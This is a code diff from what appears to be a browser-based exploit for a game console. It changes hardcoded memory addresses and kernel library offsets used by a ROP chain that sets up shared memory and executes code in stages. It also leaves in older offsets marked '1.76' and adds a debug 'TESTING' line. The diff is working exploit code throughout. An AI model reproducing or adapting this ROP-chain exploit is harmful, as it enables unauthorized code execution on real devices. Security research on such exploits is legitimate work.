@@ -100,13 +100,21 @@
 			{
 				exploit();
 				var chain = new rop();
+				
+				/*
+				var writeAddress = 0x926100000;
+				//var execAddress = 0x926200000;
+				var execAddress = 0x93a300000;
+				//var dataAddress = 0x926300000;
+				var dataAddress = 0x93a400000;
+				*/
 
 				var size = 0x100000;
-				var writeAddress = 0x914800000;
+				var writeAddress = 0x913400000;
 				//var execAddress = 0x926200000;
-				var execAddress = 0x914a00000;
+				var execAddress = 0x913500000;
 				//var dataAddress = 0x926300000;
-				var dataAddress = 0x915000000;
+				var dataAddress = 0x913600000;
 				var dataSegmentCount = 3;
 
 				var params = searchURIToObject(window.location.search);
@@ -125,10 +133,12 @@
 				switch(params['stage'])
 				{
 					case 0:
+					//chain.call('createSharedMemory', LIBKERNEL, 0x15170, 0, size, 1 | 2 | 4, chain.data); 1.76
 						chain.call('createSharedMemory', LIBKERNEL, 0x19660, 0, size, 1 | 2 | 4, chain.data);
 						chain.execute(function(){ params['eh1'] = getU32from(chain.data); nextStage(params); });
 						break;
 					case 1:
+					//	chain.call('createSharedMemoryAlias', LIBKERNEL, 0x151c0, params['eh1'], 1 | 2, chain.data); 1.76
 						chain.call('createSharedMemoryAlias', LIBKERNEL, 0x196B0, params['eh1'], 1 | 2, chain.data);
 						chain.execute(function(){ params['wh1'] = getU32from(chain.data); nextStage(params); });
 						break;
@@ -169,7 +179,9 @@
 							ldr.writeData(params['da1']);
 
 							chain.start(params['ea1'], params['da1']);
-							chain.write_rax_ToVariable(0);
+							//chain.write_rax_ToVariable(0);
+							document.body.innerHTML += 'TESTING<br>';
+
 							chain.execute(function()
 							{
 								params['ret'] = chain.getVariable(0);
